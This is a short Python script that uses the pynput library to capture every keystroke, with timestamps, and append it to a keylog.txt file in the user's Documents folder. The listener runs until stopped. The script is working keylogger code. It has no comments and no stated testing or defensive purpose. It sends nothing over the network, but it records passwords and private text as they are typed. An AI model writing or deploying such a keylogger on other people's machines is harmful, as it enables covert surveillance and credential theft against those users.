from pynput import keyboard
import os
from datetime import datetime

log_path = os.path.join(os.path.expanduser("~"), "Documents", "keylog.txt")

def on_press(key):
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
